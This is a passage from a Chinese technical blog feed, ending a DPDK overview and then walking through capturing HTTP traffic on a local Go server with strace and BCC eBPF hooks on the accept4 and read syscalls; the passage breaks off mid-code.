*)&amp;key);</span><br><span class="line"><span class="keyword">return</span> (<span class="keyword">uint8_t</span>)((ret &lt; <span class="number">0</span>)? portid : ipv4_l3fwd_out_if[ret]);</span><br></pre></td></tr></table></figure><p>这段代码在读取报文头部信息时，将整个头部导入了基于SSE的矢量寄存器(128位宽)，并对内部进行了掩码mask0运算，得到key，然后把key作为入口参数送入<code>rte_hash_lookup</code>运算。</p><h4 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h4><p>DPDK立足通用多核处理器，经过软件优化的不断摸索，实践出一套行之有效的方法，在IA数据包处理上取得重大性能突破。随着软硬件解耦的趋势，DPDK已经成为NFV事实上的数据面基石。着眼未来，无论是网络节点，还是计算节点或是存储节点，这些云服务的基础设施都有机会因DPDK而得到加速。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h4 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h4&gt;&lt;p&gt;什么是DPDK？对于用户，是性能出色的报数据处理加速软件库；对于开发者，是一个实践包处理新想法的创新工场；对于性能调优者，是一个绝佳的成果分
      
    
    </summary>
    
    
      <category term="Linux" scheme="elssm.github.io/tags/Linux/"/>
    
  </entry>
  
  <entry>
    <title>eBPF流量捕获实践</title>
    <link href="elssm.github.io/2022/10/05/eBPF%E6%B5%81%E9%87%8F%E6%8D%95%E8%8E%B7%E5%AE%9E%E8%B7%B5/"/>
    <id>elssm.github.io/2022/10/05/eBPF流量捕获实践/</id>
    <published>2022-10-05T03:23:09.000Z</published>
    <updated>2022-10-05T03:27:48.155Z</updated>
    
    <content type="html"><![CDATA[<h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h4><p>就目前而言，tcpdump是捕获生产中流量最常见的解决方案之一。但是缺点是它不允许应用程序级别的过滤(L7过滤)，因此每当捕获相关的HTTP会话时，最终需要存储数百兆字节的流量通过。另一种解决方案是在源代码中添加一个算法来查找相关的HTTP会话，但这需要在生产中进行代码检测，并且无法达到非侵入式可观测性。</p><p>eBPF应运而生。eBPF是Linux应用程序在Linux内核空间执行代码的一种机制。使用eBPF实现流量捕获远远超出一些标准的解决方案(WireShark、Fiddler和tcpdump)</p><p>eBPF允许添加多个过滤层并直接从内核捕获流量，从而显著减少相关数据的输出量，并确保可以高吞吐量的处理应用程序流量。</p><h4 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h4><ul><li>Ubuntu20.04</li><li>BCC v0.21.0 </li><li>GO v1.19</li></ul><h4 id="请求流程分析"><a href="#请求流程分析" class="headerlink" title="请求流程分析"></a>请求流程分析</h4><p>首先通过GO的Gin框架搭建一个简单的HTTP服务器。源码如下</p><p><code>server.go</code></p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">"fmt"</span></span><br><span class="line"><span class="string">"log"</span></span><br><span class="line"><span class="string">"math/rand"</span></span><br><span class="line"><span class="string">"net/http"</span></span><br><span class="line"><span class="string">"os"</span></span><br><span class="line"><span class="string">"time"</span></span><br><span class="line"></span><br><span class="line"><span class="string">"github.com/gin-gonic/gin"</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> (</span><br><span class="line">defaultPort    = <span class="string">"8080"</span></span><br><span class="line">maxPayloadSize = <span class="number">10</span> * <span class="number">1024</span> * <span class="number">1024</span> <span class="comment">// 10 MB</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> (</span><br><span class="line"><span class="comment">// source is a static, global rand object.</span></span><br><span class="line">source      *rand.Rand</span><br><span class="line">letterBytes = <span class="string">"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890~!@#$"</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">randStringBytes</span><span class="params">(n <span class="keyword">int</span>)</span> <span class="title">string</span></span> &#123;</span><br><span class="line">b := <span class="built_in">make</span>([]<span class="keyword">byte</span>, n)</span><br><span class="line"><span class="keyword">for</span> i := <span class="keyword">range</span> b &#123;</span><br><span class="line">b[i] = letterBytes[source.Intn(<span class="built_in">len</span>(letterBytes))]</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">string</span>(b)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">init</span><span class="params">()</span></span> &#123;</span><br><span class="line">source = rand.New(rand.NewSource(time.Now().UnixNano()))</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// customResponse holds the requested size for the response payload.</span></span><br><span class="line"><span class="keyword">type</span> customResponse <span class="keyword">struct</span> &#123;</span><br><span class="line">Size <span class="keyword">int</span> <span class="string">`json:"size"`</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">postCustomResponse</span><span class="params">(context *gin.Context)</span></span> &#123;</span><br><span class="line"><span class="keyword">var</span> customResp customResponse</span><br><span class="line"><span class="keyword">if</span> err := context.BindJSON(&amp;customResp); err != <span class="literal">nil</span> &#123;</span><br><span class="line">_ = context.AbortWithError(http.StatusBadRequest, err)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> customResp.Size &gt; maxPayloadSize &#123;</span><br><span class="line">_ = context.AbortWithError(http.StatusBadRequest, fmt.Errorf(<span class="string">"requested size %d is bigger than max allowed %d"</span>, customResp, maxPayloadSize))</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">context.JSON(http.StatusOK, <span class="keyword">map</span>[<span class="keyword">string</span>]<span class="keyword">string</span>&#123;<span class="string">"answer"</span>: randStringBytes(customResp.Size)&#125;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">engine := gin.New()</span><br><span class="line"></span><br><span class="line">engine.Use(gin.Recovery())</span><br><span class="line">engine.POST(<span class="string">"/customResponse"</span>, postCustomResponse)</span><br><span class="line"></span><br><span class="line">port := os.Getenv(<span class="string">"PORT"</span>)</span><br><span class="line"><span class="keyword">if</span> port == <span class="string">""</span> &#123;</span><br><span class="line">port = defaultPort</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">fmt.Printf(<span class="string">"listening on 0.0.0.0:%s\n"</span>, port)</span><br><span class="line"><span class="keyword">if</span> err := engine.Run(fmt.Sprintf(<span class="string">"0.0.0.0:%s"</span>, port)); err != <span class="literal">nil</span> &#123;</span><br><span class="line">log.Fatal(err)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>执行代码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:/home/caoyifan/eBPF-Sniffer# go run server.go</span><br><span class="line">server.go:11:2: no required module provides package github.com/gin-gonic/gin; to add it:</span><br><span class="line">go get github.com/gin-gonic/gin</span><br></pre></td></tr></table></figure><p>如上因为没有安装gin框架，因此我们先安装gin框架。修改代理后使用<code>go get</code>命令</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">export GOPROXY="https://goproxy.cn"</span><br><span class="line">go mod init xx</span><br><span class="line">go mod tidy</span><br></pre></td></tr></table></figure><p>下载完成后运行server服务</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:/home/caoyifan/eBPF-Sniffer# go run server.go</span><br><span class="line">[GIN-debug] [WARNING] Running in "debug" mode. Switch to "release" mode in production.</span><br><span class="line"> - using env:export GIN_MODE=release</span><br><span class="line"> - using code:gin.SetMode(gin.ReleaseMode)</span><br><span class="line"></span><br><span class="line">[GIN-debug] POST   /customResponse           --&gt; main.postCustomResponse (2 handlers)</span><br><span class="line">listening on 0.0.0.0:8080</span><br><span class="line">[GIN-debug] [WARNING] You trusted all proxies, this is NOT safe. We recommend you to set a value.</span><br><span class="line">Please check https://pkg.go.dev/github.com/gin-gonic/gin#readme-don-t-trust-all-proxies for details.</span><br><span class="line">[GIN-debug] Listening and serving HTTP on 0.0.0.0:8080</span><br></pre></td></tr></table></figure><p>本地发送POST请求，服务器接收到POST请求后会响应随机生成的Payload。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:/home/caoyifan# curl -X POST http://localhost:8080/customResponse -d '&#123;"size": 100&#125;'</span><br><span class="line">&#123;"answer":"Gs#UjI7u2kiOmSyJDkw7JAi3Y~Z4fauPaeThxct14qoweIUdiwDsB#9PUuvPgayVGfXQcc$E9itK1tlo5twE$cuGRvge4S~H2cS6"&#125;</span><br></pre></td></tr></table></figure><p>如果我们需要通过eBPF去捕获完整的HTTP请求，第一步需要了解到本次请求使用了哪些系统调用，因此我们可以使用<code>strace</code>工具进行查看。</p><p>通过如下命令运行server服务</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo strace -f -o syscalls_dump.txt go run server.go</span><br></pre></td></tr></table></figure><ul><li><code>-f</code>：从服务器的线程中捕获系统调用</li><li><code>-o</code>：将结果写入到文件中</li></ul><p>接着再次运行上述POST请求</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:/home/caoyifan# curl -X POST http://localhost:8080/customResponse -d '&#123;"size": 100&#125;'</span><br><span class="line">&#123;"answer":"Gs#UjI7u2kiOmSyJDkw7JAi3Y~Z4fauPaeThxct14qoweIUdiwDsB#9PUuvPgayVGfXQcc$E9itK1tlo5twE$cuGRvge4S~H2cS6"&#125;</span><br></pre></td></tr></table></figure><p>查看<code>syscalls_dump.txt</code>文件</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">2507558 accept4(3,  &lt;unfinished ...&gt;</span><br><span class="line">2507562 epoll_pwait(4,  &lt;unfinished ...&gt;</span><br><span class="line">2507559 nanosleep(&#123;tv_sec=0, tv_nsec=20000&#125;,  &lt;unfinished ...&gt;</span><br><span class="line">2507558 &lt;... accept4 resumed&gt; 0xc00031fa28, [112], SOCK_CLOEXEC|SOCK_NONBLOCK) = -1 EAGAIN (Resource temporarily unavailable)</span><br><span class="line">2507562 &lt;... epoll_pwait resumed&gt; [&#123;EPOLLIN|EPOLLOUT, &#123;u32=3021211368, u64=140633135384296&#125;&#125;], 128, 0, NULL, 0) = 1</span><br><span class="line">2507562 epoll_pwait(4,  &lt;unfinished ...&gt;</span><br><span class="line">2507559 &lt;... nanosleep resumed&gt; NULL)   = 0</span><br><span class="line">2507559 nanosleep(&#123;tv_sec=0, tv_nsec=20000&#125;,  &lt;unfinished ...&gt;</span><br><span class="line">2507558 read(7, "POST /customResponse HTTP/1.1\r\nH"..., 4096) = 175</span><br><span class="line">2507558 write(7, "HTTP/1.1 200 OK\r\nContent-Type: a"..., 237 &lt;unfinished ...&gt;</span><br><span class="line">2507559 &lt;... nanosleep resumed&gt; NULL)   = 0</span><br><span class="line">2507559 nanosleep(&#123;tv_sec=0, tv_nsec=20000&#125;, NULL) = 0</span><br><span class="line">2507558 futex(0xc000080148, FUTEX_WAKE_PRIVATE, 1 &lt;unfinished ...&gt;</span><br><span class="line">2507559 nanosleep(&#123;tv_sec=0, tv_nsec=20000&#125;,  &lt;unfinished ...&gt;</span><br><span class="line">2507558 &lt;... futex resumed&gt; )           = 1</span><br><span class="line">2507561 &lt;... futex resumed&gt; )           = 0</span><br><span class="line">2507559 &lt;... nanosleep resumed&gt; NULL)   = 0</span><br><span class="line">2507561 nanosleep(&#123;tv_sec=0, tv_nsec=3000&#125;,  &lt;unfinished ...&gt;</span><br><span class="line">2507559 nanosleep(&#123;tv_sec=0, tv_nsec=20000&#125;,  &lt;unfinished ...&gt;</span><br><span class="line">2507561 &lt;... nanosleep resumed&gt; NULL)   = 0</span><br><span class="line">2507559 &lt;... nanosleep resumed&gt; NULL)   = 0</span><br><span class="line">....</span><br><span class="line">2507558 close(7 &lt;unfinished ...&gt;</span><br></pre></td></tr></table></figure><p>通过上述文件可以看到。服务器首先使用<code>accept4</code>系统调用来接受一个新的连接。整个请求服务器的调用流程如下：</p><ul><li><code>accept4</code>：使用系统调用接受新连接</li><li><code>read</code>：使用套接字文件描述符(fd)上的系统调用从套接字读取内容</li><li><code>write</code>：使用套接字文件描述符(fd)上的系统调用将响应写入套接字</li><li><code>close</code>：使用系统调用关闭文件描述符</li></ul><h4 id="内核代理eBPF实现"><a href="#内核代理eBPF实现" class="headerlink" title="内核代理eBPF实现"></a>内核代理eBPF实现</h4><p>我们需要通过eBPF hook 8个钩子，分别是<code>accept4、read、write、close</code>的进入和退出钩子。程序通过C语言编写，我们会通过所有的钩子组合来执行完整的捕获过程。</p><p>在大多数情况下，eBPF程序由执行hook的内核代理和处理从内核发送的事件的用户代理组成。在一些其他用例中，可能只有内核代理（如阻止恶意流量的防火墙）</p><p>首先我们需要挂载<code>accept4</code>系统调用。在eBPF程序中，我们可以在每个系统调用的进入和退出放置钩子。这对于获取系统调用的输入参数很有用。</p><p>在如下代码片段中，我们声明结构体以将系统调用的输入参数保存在系统调用的入口中，并在<code>accept4</code>系统调用的出口处使用。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 保存系统调用的addr参数结构</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">accept_args_t</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span>* <span class="title">addr</span>;</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// map映射，在入口和返回钩子之间缓存接受系统调用的输入参数</span></span><br><span class="line">BPF_HASH(active_accept_args_map, <span class="keyword">uint64_t</span>, struct <span class="keyword">accept_args_t</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Hooking the entry of accept4</span></span><br><span class="line"><span class="comment">// the signature of the syscall is int accept(int sockfd, struct sockaddr *addr, socklen_t *addrlen);</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">syscall__probe_entry_accept4</span><span class="params">(struct pt_regs* ctx, <span class="keyword">int</span> sockfd, struct sockaddr* addr, <span class="keyword">socklen_t</span>* addrlen)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 获取相关pid中线程唯一id，这样可以链接同一线程的不同调用。</span></span><br><span class="line">    <span class="keyword">uint64_t</span> id = bpf_get_current_pid_tgid();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 将addr保存在map中，方便accept4退出时使用</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">accept_args_t</span> <span class="title">accept_args</span> = &#123;</span>&#125;;</span><br><span class="line">    accept_args.addr = (struct sockaddr_in *)addr;</span><br><span class="line">    active_accept_args_map.update(&amp;id, &amp;accept_args);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Hooking the exit of accept4</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">syscall__probe_ret_accept4</span><span class="params">(struct pt_regs* ctx)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">uint64_t</span> id = bpf_get_current_pid_tgid();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 从map中获取addr</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">accept_args_t</span>* <span class="title">accept_args</span> = <span class="title">active_accept_args_map</span>.<span class="title">lookup</span>(&amp;<span class="title">id</span>);</span></span><br><span class="line">    <span class="comment">// 如果map映射中存在 id，我们将获得一个非空指针，该指针保存来自系统调用条目的输入地址参数。</span></span><br><span class="line">    <span class="keyword">if</span> (accept_args != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        process_syscall_accept(ctx, id, accept_args);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 最后清理map</span></span><br><span class="line">    active_accept_args_map.<span class="keyword">delete</span>(&amp;id);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>由于在系统调用进入期间我们无法知道系统调用是否会成功，并且在系统调用退出期间我们无法访问输入参数，因此我们需要存储参数。这里我们使用的逻辑是<code>process_syscall_accept</code>，该函数会检查系统调用是否成功完成，然后我们会将链接信息保存在全局map中，以便后续的系统调用(read、write、close)使用。</p><p>在下面的代码中，我们创建了<code>accept4</code>hook使用的函数。并在我们自己的map映射中注册到服务器上的任何新的连接。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 一个结构体，表示由 pid、fd和结构体timestamp组成的唯一ID。</span></span><br><span class="line"><span class="comment">// descriptor and the creation time of the struct.</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">conn_id_t</span> &#123;</span></span><br><span class="line">    <span class="comment">// 进程ID</span></span><br><span class="line">    <span class="keyword">uint32_t</span> pid;</span><br><span class="line">    <span class="comment">// 打开的网络连接的fd</span></span><br><span class="line">    <span class="keyword">int32_t</span> fd;</span><br><span class="line">    <span class="comment">// 结构体初始化时的时间戳</span></span><br><span class="line">    <span class="keyword">uint64_t</span> tsid;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 该结构包含建立连接时通过accept4() 系统调用收集的信息。</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">conn_info_t</span> &#123;</span></span><br><span class="line">    <span class="comment">// 连接标识符</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">conn_id_t</span> <span class="title">conn_id</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 在此连接上写入/读取的字节数</span></span><br><span class="line">    <span class="keyword">int64_t</span> wr_bytes;</span><br><span class="line">    <span class="keyword">int64_t</span> rd_bytes;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 指示我们将连接识别为HTTP的标志</span></span><br><span class="line">    <span class="keyword">bool</span> is_http;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 发送到用户代理的事件结构</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">socket_open_event_t</span> &#123;</span></span><br><span class="line">    <span class="comment">// 事件发生的事件</span></span><br><span class="line">    <span class="keyword">uint64_t</span> timestamp_ns;</span><br><span class="line">    <span class="comment">// 连接的唯一ID</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">conn_id_t</span> <span class="title">conn_id</span>;</span></span><br><span class="line">    <span class="comment">// 客户端地址</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">addr</span>;</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 活动连接的映射。map名字是conn_info_map</span></span><br><span class="line">BPF_HASH(conn_info_map, <span class="keyword">uint64_t</span>, struct <span class="keyword">conn_info_t</span>, <span class="number">131072</span>);</span><br><span class="line"><span class="comment">// 一个性能缓冲区，允许我们将事件从内核发送到用户模式</span></span><br><span class="line"><span class="comment">// 该性能缓冲区专用于特殊类型的事件-打开事件</span></span><br><span class="line">BPF_PERF_OUTPUT(socket_open_events);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 检查系统调用是否成功完成以及是否将新连接保存在专用连接映射中的帮助函数</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> __inline <span class="keyword">void</span> <span class="title">process_syscall_accept</span><span class="params">(struct pt_regs* ctx, <span class="keyword">uint64_t</span> id, <span class="keyword">const</span> struct <span class="keyword">accept_args_t</span>* args)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 提取返回码，检查是否失败，如果是，直接终止。</span></span><br><span class="line">    <span class="keyword">int</span> ret_fd = PT_REGS_RC(ctx);</span><br><span class="line">    <span class="keyword">if</span> (ret_fd &lt;= <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">conn_info_t</span> <span class="title">conn_info</span> = &#123;</span>&#125;;</span><br><span class="line">    <span class="keyword">uint32_t</span> pid = id &gt;&gt; <span class="number">32</span>;</span><br><span class="line">    conn_info.conn_id.pid = pid;</span><br><span class="line">    conn_info.conn_id.fd = ret_fd;</span><br><span class="line">    conn_info.conn_id.tsid = bpf_ktime_get_ns();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">uint64_t</span> pid_fd = ((<span class="keyword">uint64_t</span>)pid &lt;&lt; <span class="number">32</span>) | (<span class="keyword">uint32_t</span>)ret_fd;</span><br><span class="line">    <span class="comment">// 将连接信息保存在全局map中，因此在其他系统调用（read、write和close）中，我们将能够知道已经看到了连接</span></span><br><span class="line">    conn_info_map.update(&amp;pid_fd, &amp;conn_info);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 向用户模式发送一个打开事件，让用户模式知道我们已经识别了一个新的连接。</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">socket_open_event_t</span> <span class="title">open_event</span> = &#123;</span>&#125;;</span><br><span class="line">    open_event.timestamp_ns = bpf_ktime_get_ns();</span><br><span class="line">    open_event.conn_id = conn_info.conn_id;</span><br><span class="line">bpf_probe_read(&amp;open_event.addr, <span class="keyword">sizeof</span>(open_event.addr), args-&gt;addr);</span><br><span class="line"></span><br><span class="line">    socket_open_events.perf_submit(ctx, &amp;open_event, <span class="keyword">sizeof</span>(struct <span class="keyword">socket_open_event_t</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>到此，我们能够在内核侧识别新的连接并将信息发送至用户代理。接下来，我们将hook read系统调用</p><p>在下面的代码中，我们将hook read系统调用</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 一个辅助结构，用于缓存入口钩子和出口钩子之间读/写系统调用的输入参数。</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">data_args_t</span> &#123;</span></span><br><span class="line">    <span class="keyword">int32_t</span> fd;</span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">char</span>* buf;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// map 存储入口和出口挂钩之间的读取系统调用参数。</span></span><br><span class="line">BPF_HASH(active_read_args_map, <span class="keyword">uint64_t</span>, struct <span class="keyword">data_args_t</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// original signature: ssize_t read(int fd, void *buf, size_t count);</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">syscall__probe_entry_read</span><span class="params">(struct pt_regs* ctx, <span class="keyword">int</span> fd, <span class="keyword">char</span>* buf, <span class="keyword">size_t</span> count)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">uint64_t</span> id = bpf_get_current_pid_tgid();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 存储参数</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">data_args_t</span> <span class="title">read_args</span> = &#123;</span>&#125;;</span><br><span class="line">    read_args.fd = fd;</span><br><span class="line">    read_args.buf = buf;</span><br><span class="line">    active_read_args_map.update(&amp;id, &amp;read_args);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">syscall__probe_ret_read</span><span class="params">(struct pt_regs* ctx)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">uint64_t</span> id = bpf_get_current_pid_tgid();</span><br><span 